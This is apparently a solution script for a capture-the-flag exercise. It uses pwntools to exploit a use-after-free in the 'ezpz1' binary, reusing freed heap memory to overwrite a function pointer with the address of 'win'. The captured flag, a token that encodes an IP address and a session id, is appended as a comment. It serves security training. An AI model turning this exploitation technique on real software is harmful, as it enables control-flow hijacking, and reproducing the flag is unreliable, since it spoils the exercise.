#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./ezpz1"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 7002

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def create():
    p.sendlineafter("):", "C")

def destroy(id):
    p.sendlineafter("):", "D")
    p.sendlineafter("id:", str(id))

# Overwriting set() :)
def set(id, question):
    p.sendlineafter("):", "S")
    p.sendlineafter("id:", str(id))
    p.sendlineafter("question:", question)

def ask(id):
    p.sendlineafter("):", "A")
    p.sendlineafter("id:", str(id))

start()

# Create a question and delete it
create()
destroy(0)

# Create another question, it will have the same location as the previous question
# So the "question" will overwrite the address for print_question()
create()
set(1, p32(elf.symbols["win"]))
ask(0)

p.interactive()
p.close()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MSIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiZDQ0MTk3NTAtZjRhMi00MzRkLTgzY2YtNzk5ZGMyMWJmOGJlIn0.VLWA8CPJlCywtgQtp670XopDsi-XDA9IXnGamf7nZQE}